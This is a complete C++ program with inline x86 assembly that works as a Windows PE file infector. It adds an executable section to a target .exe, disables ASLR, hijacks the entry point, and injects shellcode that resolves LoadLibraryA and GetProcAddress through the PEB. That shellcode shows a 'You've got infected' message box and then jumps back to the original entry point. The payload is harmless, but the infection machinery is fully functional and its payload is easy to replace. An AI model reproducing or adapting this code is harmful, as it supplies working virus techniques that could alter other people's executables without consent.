#include <windows.h>
#include <imagehlp.h>
#include <winternl.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib, "imagehlp")

using namespace std;

// Align the given size to the given alignment and returns the aligned address
DWORD align(DWORD size, DWORD align, DWORD address) {
    if (!(size % align))
        return address + size;
    return address + (size / align + 1) * align;
}

bool CreateNewSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& bytesWritten, DWORD sizeOfSection) {
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    WORD sectionCount = pNtHeader->FileHeader.NumberOfSections;

    const char sectionName[] = ".inflect";

    // Check if '.inflect' section exist
    for (int order = 0; order < sectionCount; order++) {
        PIMAGE_SECTION_HEADER currentSection = pSectionHeader + order;
        if (!strcmp((char*)currentSection->Name, sectionName)) {
            cerr << "PE section already exists" << endl;
            CloseHandle(hFile);
            return false;
        }
    }

    ZeroMemory(&pSectionHeader[sectionCount], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&pSectionHeader[sectionCount].Name, sectionName, 8);
    // Using 8 bytes for section name,cause it is the maximum allowed section name size

    // Insert all the required information about our new PE section
    pSectionHeader[sectionCount].Misc.VirtualSize = align(sizeOfSection, pNtHeader->OptionalHeader.SectionAlignment, 0);
    pSectionHeader[sectionCount].VirtualAddress = align(pSectionHeader[sectionCount - 1].Misc.VirtualSize, pNtHeader->OptionalHeader.SectionAlignment, pSectionHeader[sectionCount - 1].VirtualAddress);
    pSectionHeader[sectionCount].SizeOfRawData = align(sizeOfSection, pNtHeader->OptionalHeader.FileAlignment, 0);
    pSectionHeader[sectionCount].PointerToRawData = align(pSectionHeader[sectionCount - 1].SizeOfRawData, pNtHeader->OptionalHeader.FileAlignment, pSectionHeader[sectionCount - 1].PointerToRawData);
    pSectionHeader[sectionCount].Characteristics = 0xE00000E0;

    /*
    0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                IMAGE_SCN_CNT_CODE  |
                IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                IMAGE_SCN_MEM_EXECUTE |
                IMAGE_SCN_CNT_INITIALIZED_DATA |
                IMAGE_SCN_MEM_READ
    */

    SetFilePointer(hFile, pSectionHeader[sectionCount].PointerToRawData + pSectionHeader[sectionCount].SizeOfRawData, NULL, FILE_BEGIN);
    // End the file right here,on the last section + it's own size
    SetEndOfFile(hFile);
    // Change the size of the image,to correspond to modifications
    // Adding a new section,the image size is bigger 
    pNtHeader->OptionalHeader.SizeOfImage = pSectionHeader[sectionCount].VirtualAddress + pSectionHeader[sectionCount].Misc.VirtualSize;
    // After adding a new section, change the number of section
    pNtHeader->FileHeader.NumberOfSections += 1;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    // Adding all the modifications to the file
    WriteFile(hFile, pByte, fileSize, &bytesWritten, NULL);
    // CloseHandle(hFile);
    return true;
}

bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& byteWritten) {
    // Disable ASLR
    pNtHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    // Insert code into last section
    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);

    SetFilePointer(hFile, 0, 0, FILE_BEGIN);
    // Save the OEP
    DWORD OEP = pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase;

    // Change the EP to point to the last section created
    pNtHeader->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress;
    WriteFile(hFile, pByte, fileSize, &byteWritten, 0);

    // Obtain the opcodes
    DWORD start(0), end(0);
    __asm {
        mov eax, loc1
        mov[start], eax
        ; Jump over the second __asm without executing it in the infector itself
        jmp over
        loc1 :
    }

    __asm {
        // Read the base address of kernel32.dll from PEB, walk it's export table (EAT) and search for functions
        mov eax, fs: [30h]
        mov eax, [eax + 0x0c]; 12
        mov eax, [eax + 0x14]; 20
        mov eax, [eax]
        mov eax, [eax]
        mov eax, [eax + 0x10]; 16

        mov   ebx, eax; Take the base address of kernel32
        mov   eax, [ebx + 0x3c]; PE header VMA
        mov   edi, [ebx + eax + 0x78]; Export table relative offset
        add   edi, ebx; Export table VMA
        mov   ecx, [edi + 0x18]; Number of names

        mov   edx, [edi + 0x20]; Names table relative offset
        add   edx, ebx; Names table VMA
        ; now lets look for a function named LoadLibraryA

        LLA :
            dec ecx
            mov esi, [edx + ecx * 4]; Store the relative offset of the name
            add esi, ebx; Set esi to the VMA of the current name
            cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
            je LLALOOP1
            LLALOOP1 :
            cmp dword ptr[esi + 4], 0x7262694c
            ; L(4c)i(69)b(62)r(72)
            je LLALOOP2
            LLALOOP2 :
            cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
            je stop; if its = then jump to stop because we found it
            jmp LLA; Load LibraryA
        stop :
            mov   edx, [edi + 0x24]; Table of ordinals relative
            add   edx, ebx; Table of ordinals
            mov   cx, [edx + 2 * ecx]; function ordinal
            mov   edx, [edi + 0x1c]; Address table relative offset
            add   edx, ebx; Table address
            mov   eax, [edx + 4 * ecx]; ordinal offset
            add   eax, ebx; Function VMA
            ; EAX holds address of LoadLibraryA now


            sub esp, 11
            mov ebx, esp
            mov byte ptr[ebx], 0x75; u
            mov byte ptr[ebx + 1], 0x73; s
            mov byte ptr[ebx + 2], 0x65; e
            mov byte ptr[ebx + 3], 0x72; r
            mov byte ptr[ebx + 4], 0x33; 3
            mov byte ptr[ebx + 5], 0x32; 2
            mov byte ptr[ebx + 6], 0x2e; .
            mov byte ptr[ebx + 7], 0x64; d
            mov byte ptr[ebx + 8], 0x6c; l
            mov byte ptr[ebx + 9], 0x6c; l
            mov byte ptr[ebx + 10], 0x0

            push ebx

            // Call LoadLibraryA with user32.dll as argument
            call eax;
            add esp, 11
            // Save the return address of LoadLibraryA for later use in GetProcAddress
            push eax

            // Look again for a function named GetProcAddress
            mov eax, fs: [30h]
            mov eax, [eax + 0x0c]; 12
            mov eax, [eax + 0x14]; 20
            mov eax, [eax]
            mov eax, [eax]
            mov eax, [eax + 0x10]; 16

            mov   ebx, eax; Take the base address of kernel32
            mov   eax, [ebx + 0x3c]; PE header VMA
            mov   edi, [ebx + eax + 0x78]; Export table relative offset
            add   edi, ebx; Export table VMA
            mov   ecx, [edi + 0x18]; Number of names

            mov   edx, [edi + 0x20]; Names table relative offset
            add   edx, ebx; Names table VMA
        GPA :
            dec ecx
            mov esi, [edx + ecx * 4]; Store the relative offset of the name
            add esi, ebx; Set esi to the VMA of the current name
            cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
            je GPALOOP1
            
        GPALOOP1 :
            cmp dword ptr[esi + 4], 0x41636f72
            ; backwards remember : r(72)o(6f)c(63)A(41)
            je GPALOOP2

        GPALOOP2 :
            cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
            ; no need to continue to look further cause there is no other function starting with GetProcAddre
            je stp; if its = then jump to stop because we found it
            jmp GPA

        stp :
            mov   edx, [edi + 0x24]; Table of ordinals relative
            add   edx, ebx; Table of ordinals
            mov   cx, [edx + 2 * ecx]; function ordinal
            mov   edx, [edi + 0x1c]; Address table relative offset
            add   edx, ebx; Table address
            mov   eax, [edx + 4 * ecx]; ordinal offset
            add   eax, ebx; Function VMA
            ; EAX HOLDS THE ADDRESS OF GetProcAddress
            mov esi, eax

            sub esp, 12
            mov ebx, esp
            mov byte ptr[ebx], 0x4d      //M
            mov byte ptr[ebx + 1], 0x65  //e
            mov byte ptr[ebx + 2], 0x73  //s
            mov byte ptr[ebx + 3], 0x73  //s
            mov byte ptr[ebx + 4], 0x61  //a
            mov byte ptr[ebx + 5], 0x67  //g
            mov byte ptr[ebx + 6], 0x65  //e
            mov byte ptr[ebx + 7], 0x42  //B
            mov byte ptr[ebx + 8], 0x6f  //o
            mov byte ptr[ebx + 9], 0x78  //x
            mov byte ptr[ebx + 10], 0x41 //A
            mov byte ptr[ebx + 11], 0x0

            /*
                Get back the value saved from LoadLibraryA return
                So that the call to GetProcAddress is:
                esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
            */

            mov eax, [esp + 12]
            push ebx; MessageBoxA
            push eax; base address of user32.dll retrieved by LoadLibraryA
            call esi; GetProcAddress address
            add esp, 12

            sub esp, 21
            mov ebx, esp
            mov byte ptr[ebx], 89;      Y
            mov byte ptr[ebx + 1], 111; o
            mov byte ptr[ebx + 2], 117; u
            mov byte ptr[ebx + 3], 39; `
            mov byte ptr[ebx + 4], 118; v
            mov byte ptr[ebx + 5], 101; e
            mov byte ptr[ebx + 6], 32;
            mov byte ptr[ebx + 7], 103; g
            mov byte ptr[ebx + 8], 111; o
            mov byte ptr[ebx + 9], 116; t
            mov byte ptr[ebx + 10], 32;
            mov byte ptr[ebx + 11], 105; i
            mov byte ptr[ebx + 12], 110; n
            mov byte ptr[ebx + 13], 102; f
            mov byte ptr[ebx + 14], 101; e
            mov byte ptr[ebx + 15], 99;  c
            mov byte ptr[ebx + 16], 116; t
            mov byte ptr[ebx + 17], 101; e
            mov byte ptr[ebx + 18], 100; d
            mov byte ptr[ebx + 19], 0

            push 0
            push 0
            push ebx
            push 0
            call eax
            add esp, 21

            mov eax, 0xdeadbeef; Dummy original entry point
            jmp eax
    }

    __asm {
    over:
        mov eax, loc2
            mov[end], eax
            loc2 :
    }

    byte address[1000];
    byte* checkpoint = ((byte*)(start));
    DWORD* invalidEP;
    DWORD order = 0;

    // Change 0xdeadbeef to address origin entry point with OEP
    while (order < ((end - 11) - start)) {
        invalidEP = ((DWORD*)((byte*)start + order));
        if (*invalidEP == 0xdeadbeef) {
            DWORD carrier;
            VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &carrier);
            *invalidEP = OEP;
        }
        address[order] = checkpoint[order];
        order++;
    }

    SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);
    WriteFile(hFile, address, order, &byteWritten, 0);
    return true;
}

int main(int argc, char* argv[]) {

    if (argc < 2) {
        cout << "Usage: " << argv[0] << " <path\\of\\EXE\\file>" << endl;
        return 1;
    }

    // Open file and get information
    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        cerr << "Error: Invalid file, try another one" << endl;
        return 0;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (!fileSize) {
        CloseHandle(hFile);
        cerr << "Error: File empty, try another one" << endl;
        return 0;
    }
    // Buffer to allocate
    BYTE* pByte = new BYTE[fileSize];
    DWORD byteWritten;

    // Reading the entire file to use the PE information
    if (!ReadFile(hFile, pByte, fileSize, &byteWritten, NULL)) {
        cerr << "Error: Fail to read file" << endl;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        cerr << "Error: Invalid path or PE format" << endl;
        return 0;
    }

    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
    if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        CloseHandle(hFile);
        cerr << "Error: PE32+ detected, this version works only with PE32" << endl;
        return 0;
    }

    if (!CreateNewSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400)) {
        cerr << "Error: Fail to create new section" << endl;
        return 0;
    }

    // Insert data into the last section
    if (!InflectSection(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
        cerr << "Error: Fail to infect Message Box" << endl;
        return 0;
    }

    cerr << "Success to infect Message Box into " << argv[1] << endl;

    CloseHandle(hFile);
    return 0;
}